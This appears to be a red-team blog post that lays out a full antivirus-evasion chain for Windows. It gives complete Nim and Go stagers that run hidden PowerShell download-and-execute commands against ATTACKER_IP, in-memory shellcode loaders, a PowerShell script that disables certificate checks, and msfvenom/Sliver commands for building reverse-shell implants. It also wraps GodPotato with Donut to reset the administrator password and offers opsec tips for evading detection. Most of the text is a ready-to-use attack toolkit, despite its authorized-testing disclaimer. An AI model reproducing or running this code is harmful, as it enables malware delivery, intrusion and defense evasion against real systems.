---
layout: default
title: "AV Bypass: Stagers, Shellcode Loaders, and Payload Staging"
date: 2025-12-19
tags: ["av-bypass", "red-team", "shellcode", "stagers", "windows", "evasion", "sliver", "c2"]
---

<div class="terminal-output">
  <p>
    <span class="prompt-symbol">$</span> <span style="color: var(--cyan);">cat ~/blog/av-bypass-stagers.md</span>
  </p>
</div>

## Introduction

Modern antivirus and EDR solutions have become incredibly effective at detecting malicious executables. Dropping a raw Meterpreter or Sliver implant on disk is almost guaranteed to get flagged. The solution? **Payload staging**—a technique where we separate the delivery mechanism from the actual payload.

This post covers my personal AV bypass methodology using:
1. **Stagers** - Small executables that fetch and execute payloads
2. **Shellcode Loaders** - Programs that load and execute raw shellcode in memory
3. **Payload Encoding** - Obfuscation techniques to avoid signature detection

> **Disclaimer**: This information is for authorized security testing and educational purposes only. Always obtain proper authorization before testing these techniques.

---

## The Staging Concept

Traditional payload delivery:
```
[Malicious EXE] → [Disk] → [Execution] → [Detection]
```

Staged payload delivery:
```
[Clean Stager] → [Downloads Payload] → [Memory Execution] → [Evasion]
```

The key insight is that we split our attack into multiple stages:
1. **Stage 0**: Initial access (stager) - appears benign
2. **Stage 1**: Shellcode loader - fetches and decodes payload
3. **Stage 2**: Actual implant - executes entirely in memory

---

## Part 1: Stagers

Stagers are small, simple programs whose only job is to download and execute the next stage. Because they contain no malicious code themselves, they're less likely to trigger AV signatures.

### Types of Stagers

I maintain several stagers written in different languages, each with tradeoffs:

| Stager | Language | Size | Use Case |
|--------|----------|------|----------|
| `ps_stager.nim` | Nim | ~70KB | PowerShell script execution |
| `http_stager.nim` | Nim | ~148KB | Download and execute EXE |
| `shellcode_loader.nim` | Nim | ~146KB | Direct shellcode injection |
| `stager.go` | Go | ~1MB | PowerShell script execution |
| `stager.ps1` | PowerShell | ~2.5KB | Full staging chain |

### Nim PowerShell Stager

This stager downloads and executes a PowerShell script in a hidden window:

```nim
import winim/lean
import strformat

proc ExecutePowerShell(url: string): void =
  let command = fmt"IEX(IWR -UseBasicParsing {url})"

  var si: STARTUPINFO
  var pi: PROCESS_INFORMATION
  si.cb = sizeof(STARTUPINFO).cint
  si.dwFlags = STARTF_USESHOWWINDOW
  si.wShowWindow = SW_HIDE

  let cmdLine = fmt"powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command ""{command}"""

  discard CreateProcessW(
    nil,
    newWideCString(cmdLine),
    nil, nil, FALSE,
    CREATE_NO_WINDOW,
    nil, nil,
    addr si, addr pi
  )

when isMainModule:
  ExecutePowerShell("http://ATTACKER_IP:8000/stager.ps1")
```

**How it works:**
1. Uses the Windows API `CreateProcessW` to spawn PowerShell
2. Sets `SW_HIDE` and `CREATE_NO_WINDOW` flags for stealth
3. Executes `IEX(IWR ...)` to download and run a remote script
4. The stager itself contains no malicious code—just a URL

**Compilation:**
```bash
nim c -d:mingw --gcc.exe:x86_64-w64-mingw32-gcc \
  -d:release --cpu:amd64 --os:windows -d:strip --opt:size \
  -o:ps_stager.exe ps_stager.nim
```

### Nim HTTP Stager

Downloads an executable and runs it:

```nim
import winim/lean
import httpclient
import os

proc DownloadAndExecute(url: string): void =
  var client = newHttpClient()
  var payload: string = client.getContent(url)

  # Save to temp file
  let tempPath = getTempDir() & "\\update.exe"
  writeFile(tempPath, payload)

  # Execute hidden
  var si: STARTUPINFO
  var pi: PROCESS_INFORMATION
  si.cb = sizeof(STARTUPINFO).cint
  si.dwFlags = STARTF_USESHOWWINDOW
  si.wShowWindow = SW_HIDE

  discard CreateProcessW(
    newWideCString(tempPath),
    nil, nil, nil, FALSE,
    CREATE_NO_WINDOW,
    nil, nil,
    addr si, addr pi
  )

when isMainModule:
  DownloadAndExecute("http://ATTACKER_IP:8000/payload.exe")
```

**Tradeoff**: This drops a file to disk, which is riskier than in-memory execution.

### Nim Shellcode Loader

The most evasive option—loads shellcode directly into memory:

```nim
import winim/lean
import httpclient

func toByteSeq*(str: string): seq[byte] {.inline.} =
  @(str.toOpenArrayByte(0, str.high))

proc DownloadExecute(url: string): void =
  var client = newHttpClient()
  var response: string = client.getContent(url)

  var shellcode: seq[byte] = toByteSeq(response)
  let tProcess = GetCurrentProcessId()
  var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)
  defer: CloseHandle(pHandle)

  # Allocate executable memory
  let rPtr = VirtualAllocEx(
    pHandle, NULL,
    cast[SIZE_T](len(shellcode)),
    0x3000,  # MEM_COMMIT | MEM_RESERVE
    PAGE_EXECUTE_READ_WRITE
  )

  # Copy shellcode to allocated memory
  copyMem(rPtr, addr shellcode[0], len(shellcode))

  # Execute shellcode
  let f = cast[proc() {.nimcall.}](rPtr)
  f()

when isMainModule:
  DownloadExecute("http://ATTACKER_IP/shellcode.bin")
```

**How it works:**
1. Downloads raw shellcode bytes via HTTP
2. Allocates RWX (Read-Write-Execute) memory in current process
3. Copies shellcode to allocated memory
4. Casts memory address to a function pointer and calls it
5. No files written to disk

### Go PowerShell Stager

A simple Go alternative:

```go
package main

import "os/exec"

func main() {
    cmd := exec.Command(
        "powershell",
        "-NoP", "-NonI", "-W", "Hidden", "-Exec", "Bypass",
        "-Command", "IEX(IWR -UseBasicParsing http://ATTACKER_IP:8000/stager.ps1)",
    )
    cmd.Run()
}
```

**Compilation:**
```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o stager.exe stager.go
```

The Go binary is larger (~1MB) but may have different detection characteristics.

---

## Part 2: The Go Shellcode Loader (runner.exe)

The shellcode loader is the heart of the AV bypass chain. It's responsible for:
1. Fetching encoded shellcode from a URL or local file
2. Decoding the payload (base64)
3. Allocating executable memory
4. Executing the shellcode

### Full Source Code

```go
package main

import (
    "encoding/base64"
    "flag"
    "fmt"
    "io/ioutil"
    "net/http"
    "os"
    "unsafe"

    "golang.org/x/sys/windows"
)

var (
    kernel32                = windows.NewLazySystemDLL("kernel32.dll")
    procCreateThread        = kernel32.NewProc("CreateThread")
    procWaitForSingleObject = kernel32.NewProc("WaitForSingleObject")
    procRtlMoveMemory       = kernel32.NewProc("RtlMoveMemory")
)

func checkError(err error, msg string) {
    if err != nil {
        fmt.Fprintf(os.Stderr, "[!] %s: %v\n", msg, err)
        os.Exit(1)
    }
}

func loadShellcodeFromURL(url string) []byte {
    resp, err := http.Get(url)
    checkError(err, "Failed to download shellcode")
    defer resp.Body.Close()
    data, err := ioutil.ReadAll(resp.Body)
    checkError(err, "Failed to read response")
    return data
}

func decodeBase64(data []byte) []byte {
    decoded, err := base64.StdEncoding.DecodeString(string(data))
    checkError(err, "Failed to decode base64")
    return decoded
}

func executeShellcode(shellcode []byte) {
    // Allocate executable memory
    addr, err := windows.VirtualAlloc(
        0,
        uintptr(len(shellcode)),
        windows.MEM_COMMIT|windows.MEM_RESERVE,
        windows.PAGE_EXECUTE_READWRITE,
    )
    checkError(err, "VirtualAlloc failed")

    // Copy shellcode to allocated memory
    procRtlMoveMemory.Call(
        addr,
        (uintptr)(unsafe.Pointer(&shellcode[0])),
        uintptr(len(shellcode)),
    )

    // Create thread to execute shellcode
    thread, _, _ := procCreateThread.Call(0, 0, addr, 0, 0, 0)

    // Wait for execution
    procWaitForSingleObject.Call(thread, windows.INFINITE)
}

func main() {
    localPath := flag.String("local", "", "Local shellcode file")
    remoteURL := flag.String("remote", "", "Remote shellcode URL")
    flag.Parse()

    var encodedShellcode []byte

    if *localPath != "" {
        encodedShellcode, _ = ioutil.ReadFile(*localPath)
    } else if *remoteURL != "" {
        encodedShellcode = loadShellcodeFromURL(*remoteURL)
    } else {
        fmt.Println("Usage:")
        fmt.Println("  runner.exe -local C:\\path\\to\\shellcode.enc")
        fmt.Println("  runner.exe -remote http://host/shellcode.enc")
        os.Exit(1)
    }

    shellcode := decodeBase64(encodedShellcode)
    executeShellcode(shellcode)
}
```

### Breaking Down the Execution Flow

**Step 1: Memory Allocation**
```go
addr, err := windows.VirtualAlloc(
    0,                                          // Let Windows choose address
    uintptr(len(shellcode)),                   // Size of shellcode
    windows.MEM_COMMIT|windows.MEM_RESERVE,    // Commit and reserve
    windows.PAGE_EXECUTE_READWRITE,            // RWX permissions
)
```

`VirtualAlloc` reserves a region of memory with execute permissions. This is where our shellcode will live.

**Step 2: Copy Shellcode**
```go
procRtlMoveMemory.Call(
    addr,                                      // Destination
    (uintptr)(unsafe.Pointer(&shellcode[0])), // Source
    uintptr(len(shellcode)),                  // Size
)
```

`RtlMoveMemory` copies our decoded shellcode into the allocated memory region.

**Step 3: Thread Creation**
```go
thread, _, _ := procCreateThread.Call(
    0,    // Security attributes
    0,    // Stack size (default)
    addr, // Start address (our shellcode!)
    0,    // Parameter
    0,    // Creation flags
    0,    // Thread ID
)
```

`CreateThread` spawns a new thread that begins execution at our shellcode's memory address.

**Compilation:**
```bash
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o runner.exe main.go
```

---

## Part 3: The PowerShell Stager (stager.ps1)

This is the orchestration script that ties everything together:

```powershell
# ========================================
# CONFIGURATION - Modify these values
# ========================================
$runnerUrl = "http://ATTACKER_IP:8000/runner.exe"
$implantUrl = "http://ATTACKER_IP:8000/implant.enc"

# ========================================
# PowerShell Stager for runner.exe
# ========================================

Write-Host "[+] PowerShell Stager Starting..."

# Setup with unique filename
$tempPath = [System.IO.Path]::GetTempPath()
$uniqueId = [System.Guid]::NewGuid().ToString().Substring(0, 8)
$runnerPath = Join-Path $tempPath "runner_$uniqueId.exe"

# Disable SSL/TLS checks for HTTPS
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

Write-Host "[+] Downloading runner.exe..."
$webClient = New-Object System.Net.WebClient
$webClient.DownloadFile($runnerUrl, $runnerPath)

Write-Host "[+] Executing runner with remote implant..."
$process = Start-Process -FilePath $runnerPath `
    -ArgumentList "-remote", $implantUrl `
    -PassThru -NoNewWindow

Write-Host "[+] Runner started with PID: $($process.Id)"
```

**Execution Flow:**
1. Downloads `runner.exe` to temp directory with random name
2. Executes runner with `-remote` flag pointing to encoded implant
3. Runner downloads, decodes, and executes the shellcode

---

## Part 4: The Complete Attack Chain

Here's how all the pieces work together:

### Step 1: Generate Shellcode Implant

Using Sliver C2:
```bash
sliver > generate --mtls ATTACKER_IP:443 --format shellcode \
         --os windows --arch amd64 --save implant.bin
```

Using Meterpreter:
```bash
msfvenom -p windows/x64/meterpreter/reverse_https \
         LHOST=ATTACKER_IP LPORT=443 -f raw -o implant.bin
```

### Step 2: Base64 Encode the Shellcode

```bash
base64 -w0 implant.bin > implant.enc
```

**Why base64?**
- Avoids binary transfer issues
- Simple decoding in the loader
- Adds a layer of obfuscation
- Network traffic looks like text data

### Step 3: Why Use .bin Format?

Raw shellcode (`.bin`) is preferred over PE files (`.exe`) for several reasons:

| Format | Pros | Cons |
|--------|------|------|
| `.exe` | Easy to run directly | PE headers trigger signatures |
| `.bin` | No headers, harder to detect | Requires loader to execute |
| `.enc` | Encoded, evades content inspection | Requires decoding step |

The `.bin` format is pure machine code without:
- PE headers (MZ, DOS stub, PE signature)
- Import tables
- Section headers
- Other metadata that AV scans for

### Step 4: Host Your Payloads

```bash
# Start web server in directory with payloads
python3 -m http.server 8000

# Or use UwU Toolkit's gosh server
uwu > start gosh 8000
```

Your directory should contain:
```
.
├── runner.exe    # The Go shellcode loader
├── implant.enc   # Base64-encoded shellcode
└── stager.ps1    # PowerShell orchestration script
```

### Step 5: Execute on Target

From a web shell or existing access:
```powershell
IEX(IWR -UseBasicParsing http://ATTACKER_IP:8000/stager.ps1)
```

Or using a compiled stager:
```
# Execute ps_stager.exe which fetches stager.ps1
.\ps_stager.exe
```

### The Full Chain Visualized

```
┌─────────────────────────────────────────────────────────────────┐
│                        ATTACK CHAIN                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│   TARGET                           ATTACKER                      │
│   ──────                           ────────                      │
│                                                                  │
│   Web Shell                                                      │
│      │                                                           │
│      ▼                                                           │
│   powershell IEX(IWR .../stager.ps1)                            │
│      │                                                           │
│      ├───────────────────────────────▶ HTTP Server (:8000)      │
│      │         GET /stager.ps1                                  │
│      ◀───────────────────────────────  ◀── stager.ps1           │
│      │                                                           │
│      ▼                                                           │
│   [Execute stager.ps1]                                          │
│      │                                                           │
│      ├───────────────────────────────▶ HTTP Server              │
│      │         GET /runner.exe                                  │
│      ◀───────────────────────────────  ◀── runner.exe           │
│      │                                                           │
│      ▼                                                           │
│   [Save runner.exe to %TEMP%]                                   │
│   [Execute: runner.exe -remote .../implant.enc]                 │
│      │                                                           │
│      ├───────────────────────────────▶ HTTP Server              │
│      │         GET /implant.enc                                 │
│      ◀───────────────────────────────  ◀── implant.enc          │
│      │                                                           │
│      ▼                                                           │
│   [Base64 Decode]                                               │
│   [VirtualAlloc RWX Memory]                                     │
│   [Copy Shellcode to Memory]                                    │
│   [CreateThread → Execute]                                      │
│      │                                                           │
│      └───────────────────────────────▶ C2 Server (:443)         │
│                  mTLS Callback            │                      │
│                                           ▼                      │
│                                      Sliver Session              │
│                                                                  │
└─────────────────────────────────────────────────────────────────┘
```

---

## Part 5: Using Donut for Additional Evasion

Sometimes you need to execute a regular executable (like GodPotato) but it gets flagged. **Donut** converts PE files to position-independent shellcode:

```bash
# Convert GodPotato.exe to shellcode with arguments
donut -i GodPotato.exe -a 2 -b 2 \
      -p '-cmd "cmd /c net user administrator NewPass123!"' \
      -o gp.bin

# Encode for the loader
base64 -w0 gp.bin > gp.enc
```

Now GodPotato executes via the same staging chain:
```powershell
# Modify stager to point to gp.enc
$implantUrl = "http://ATTACKER_IP:8000/gp.enc"
```

This was demonstrated in my [Staged CTF writeup](/ctf/hacksmarter-staged/) where AV blocked GodPotato directly but allowed it through the staging chain.

---

## Compilation Quick Reference

### Nim Stagers
```bash
# PowerShell stager
nim c -d:mingw --gcc.exe:x86_64-w64-mingw32-gcc \
  --gcc.linkerexe:x86_64-w64-mingw32-gcc \
  -d:release --cpu:amd64 --os:windows -d:strip --opt:size \
  -o:ps_stager.exe ps_stager.nim

# HTTP stager
nim c -d:mingw --gcc.exe:x86_64-w64-mingw32-gcc \
  --gcc.linkerexe:x86_64-w64-mingw32-gcc \
  -d:release --cpu:amd64 --os:windows -d:strip --opt:size \
  -o:http_stager.exe http_stager.nim

# Shellcode loader
nim c -d:mingw --gcc.exe:x86_64-w64-mingw32-gcc \
  --gcc.linkerexe:x86_64-w64-mingw32-gcc \
  -d:release --cpu:amd64 --os:windows -d:strip --opt:size \
  -o:shellcode_loader.exe shellcode_loader.nim
```

### Go Binaries
```bash
# Shellcode loader (runner.exe)
cd go_shellcode_loader
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o runner.exe

# Simple stager
GOOS=windows GOARCH=amd64 go build -ldflags="-s -w" -o stager.exe stager.go
```

### Compilation Flags Explained

**Nim:**
- `-d:mingw` - Use MinGW cross-compiler
- `-d:release` - Optimized release build
- `-d:strip` - Remove debug symbols
- `--opt:size` - Optimize for smaller binary

**Go:**
- `GOOS=windows` - Target Windows
- `GOARCH=amd64` - 64-bit target
- `-ldflags="-s -w"` - Strip symbols and debug info

---

## Operational Security Tips

1. **Rotate your binaries** - Recompile between engagements
2. **Change variable names** - AV may signature specific strings
3. **Use HTTPS** - Encrypt traffic between stages
4. **Randomize file names** - Don't use `runner.exe` in production
5. **Clean up** - Remove staged files after execution
6. **Test locally** - Use a VM with AV before deployment

---

## Conclusion

Payload staging is an essential red team technique for evading modern defenses. By separating the delivery mechanism from the malicious payload and executing in memory, we significantly reduce our detection footprint.

The key components:
- **Stagers**: Small, clean programs that fetch payloads
- **Loaders**: Programs that execute shellcode in memory
- **Encoding**: Obfuscation to avoid content inspection
- **Shellcode**: Position-independent code with no PE headers

For a practical demonstration of this technique, check out my [Staged CTF writeup](/ctf/hacksmarter-staged/) where I bypassed Windows Defender to escalate privileges using this exact methodology.

---

## References

- [TheWover/donut - PE to Shellcode](https://github.com/TheWover/donut)
- [BishopFox/sliver - C2 Framework](https://github.com/BishopFox/sliver)
- [Nim for Windows Malware Development](https://github.com/byt3bl33d3r/OffensiveNim)
- [Red Team Notes - AV Evasion](https://www.ired.team/offensive-security/defense-evasion)
